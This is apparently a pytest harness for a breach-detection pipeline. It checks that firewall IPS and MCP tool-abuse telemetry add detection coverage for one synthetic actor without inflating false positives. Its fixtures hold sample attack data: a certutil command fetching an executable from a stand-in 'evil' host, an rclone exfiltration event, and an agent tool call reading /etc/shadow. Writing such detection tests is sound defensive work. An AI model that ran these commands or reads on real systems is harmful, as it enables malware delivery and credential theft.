"""Delta-validation harness — confirm/deny that a new telemetry source IMPROVES
detection of the same breach, without inflating false positives.

Methodology (mirrors the VESPER/Meridian/Santos 'report the delta' framework):
  1. Build a multi-source breach (identity + endpoint + network) for one actor and
     cluster it -> BASELINE (phases fired, actionable cluster count).
  2. Augment with the SAME breach seen from a NEW source (firewall IPS + MCP abuse),
     tied to the same actor -> AUGMENTED.
  3. Assert the DELTA:
       - POSITIVE: new detectors fire (firewall_threat, mcp_tool_abuse) — more coverage.
       - CORROBORATION: the new rows JOIN the existing campaign (cross-layer correlation),
         they don't spawn noise clusters.
       - NO REGRESSION: the original breach phases are still present (no false negative).

The full-dataset regression side ('deny delta' = no collateral damage) is covered by
scripts/e2e_assess.py on the real VESPER/Meridian/Santos files; this harness is the
'confirm delta' (positive-improvement) side that synthetic augmentation makes precise.
"""
from __future__ import annotations

from src.pipeline.streaming_ingest import normalize_row
from src.core.ingest.cluster_merge import transitive_merge_clusters

_T0 = 1_744_000_000  # April 2026, within VESPER's window

# A minimal multi-source breach for one actor (martin.chen / 203.0.113.7).
_BASE_BREACH = [
    {"_source": "azure_signin", "user": "martin.chen@acme.io", "src_ip": "203.0.113.7",
     "event_name": "oauth2/devicecode consent to application", "oauth_consent_excessive": True,
     "timestamp": "2026-04-07T01:00:00Z"},
    {"_source": "sysmon", "user": "martin.chen@acme.io", "hostname": "web01",
     "command_line": "certutil -urlcache -f http://evil/x.exe", "process_name": "certutil.exe",
     "timestamp": "2026-04-07T02:00:00Z"},
    {"_source": "zeek", "user": "martin.chen@acme.io", "src_ip": "203.0.113.7", "dst_ip": "8.8.8.8",
     "event_name": "rclone copy to remote", "bytes_out": 9_000_000_000,
     "timestamp": "2026-04-07T03:00:00Z"},
]

# The SAME breach seen from NEW sources, tied to the same actor / attacker IP.
_NEW_SOURCE_ROWS = [
    {"_source": "fortinet", "srcip": "203.0.113.7", "dstip": "10.0.0.5", "action": "deny",
     "subtype": "ips", "attack": "Apache.Struts.RCE", "user": "martin.chen@acme.io",
     "timestamp": "2026-04-07T00:30:00Z"},
    {"_source": "mcp", "agent_id": "martin.chen@acme.io", "tool_name": "read_file",
     "mcp_server": "files-mcp", "request_id": "req-9", "mcp_event": "tool_call",
     "scope_violation": True, "resource_uri": "/etc/shadow",
     "timestamp": "2026-04-07T02:30:00Z"},
]


def _cluster_metrics(rows: list[dict]) -> dict:
    norm = []
    for i, raw in enumerate(rows):
        r = normalize_row(dict(raw))
        r["row_index"] = i
        norm.append(r)
    diag: dict = {}
    clusters = transitive_merge_clusters(None, norm, diagnostics_out=diag)
    actionable = [c for c in clusters if not c.get("_isolated")]
    phases: set[str] = set()
    for c in actionable:
        for ph in (c.get("phases") or []):
            pid = ph.get("phase_id") if isinstance(ph, dict) else ph
            if pid:
                phases.add(str(pid))
    return {"n_actionable": len(actionable), "phases": phases, "clusters": actionable}


def test_new_sources_confirm_positive_delta_without_fp_inflation():
    base = _cluster_metrics(_BASE_BREACH)
    augmented = _cluster_metrics(_BASE_BREACH + _NEW_SOURCE_ROWS)

    # POSITIVE delta: the new sources' detectors fire (coverage the baseline lacked).
    new_phases = augmented["phases"] - base["phases"]
    assert "firewall_threat" in new_phases, f"firewall not detected; delta={new_phases}"
    assert "mcp_tool_abuse" in new_phases, f"MCP abuse not detected; delta={new_phases}"

    # NO REGRESSION (no false negative): every phase the baseline caught is still caught.
    assert base["phases"].issubset(augmented["phases"])

    # CORROBORATION, not noise: the new rows join the campaign rather than spawning
    # a cluster each. Actionable count grows by at most 1 (cross-layer correlation).
    assert augmented["n_actionable"] <= base["n_actionable"] + 1


def test_baseline_breach_is_actually_detected():
    # Guard: the synthetic baseline must be a real multi-phase breach, else the delta
    # test is vacuous.
    base = _cluster_metrics(_BASE_BREACH)
    assert base["n_actionable"] >= 1
    assert len(base["phases"]) >= 2  # multi-phase (not a single isolated signal)
